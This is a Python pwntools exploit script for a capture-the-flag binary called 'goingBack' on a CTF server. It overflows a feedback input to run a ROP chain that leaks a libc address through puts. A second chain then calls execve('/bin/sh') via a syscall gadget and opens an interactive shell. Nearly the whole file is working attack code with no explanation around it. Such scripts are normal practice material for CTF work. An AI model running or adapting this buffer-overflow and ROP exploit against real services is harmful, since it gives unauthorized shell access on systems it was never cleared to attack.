#!/usr/bin/env python3

from pwn import *

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("goingBack_patched")
libc = ELF("libc6_2.35-0ubuntu3_amd64.so")
ld = ELF("ld-2.35.so")

context.binary = exe

host = "dyn.ctf.pearlctf.in"
port = 30011

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

# functions

# --- end functions ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp 0x04013BC
bp 0x40131b
c
'''.format(**locals())

io = start()

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

poprdi = 0x0000000000401265 #: pop rdi ; ret
feedback = 0x40126a
ret = 0x0000000000401342 #: ret

payload = flat(
    p64(poprdi),
    p64(exe.got['setvbuf']),
    p64(exe.plt['puts']),
    p64(feedback)
)

sla(b"First Name: ", b"a")
sla(b"Last Name: ", b"b")
sla(b"Age: ", b"20")
sla(b"Bangalore\n", b"b")
sla(b"(1/0): ", b"1")
sla(b"experience from 1 to 5: ", b"1")
sla(b"Please help us to improve your future experience\n", b"a"*0x28 + payload)

leaked_setvbuf = u64(io.recv(6).ljust(8, b"\x00"))
info(f"leaked_setvbuf: {hex(leaked_setvbuf)}")
libc.address = leaked_setvbuf - libc.sym['setvbuf']
success(f"libc.address: {hex(libc.address)}")

# payload = flat(
#     p64(poprdi),
#     p64(next(libc.search(b'/bin/sh'))),
#     p64(ret),
#     p64(libc.sym['system']),
#     p64(feedback)
# )

poprdi = poprdi
poprsi = libc.address + 0x000000000002be51
pop_rax_rdx_rbx = libc.address + 0x0000000000090528
syscall = libc.address + 0x0000000000029db4

payload = flat(
    p64(poprdi),
    p64(next(libc.search(b'/bin/sh'))),
    p64(poprsi),
    p64(0),
    p64(pop_rax_rdx_rbx),
    p64(59),
    p64(0),
    p64(0),
    p64(syscall)
)

sla(b"experience from 1 to 5: ", b"1")
sla(b"Please help us to improve your future experience\n", b"a"*0x20 + p64(0x404800) + payload)

io.interactive()




